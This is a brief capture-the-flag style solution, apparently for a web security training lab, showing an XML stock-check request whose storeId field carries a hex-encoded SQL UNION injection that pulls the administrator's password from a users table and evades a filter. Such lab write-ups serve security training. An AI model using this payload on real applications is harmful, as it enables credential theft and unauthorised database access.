# Lab: SQL injection with filter bypass via XML encoding
You will need [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) Burp Suite Extension
```xml
<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
      <productId>
        2
      </productId>
    <storeId>
      <@hex_entities>
        1 union select password from users where username='administrator' 
      <@/hex_entities>
    </storeId>
  </stockCheck>
```
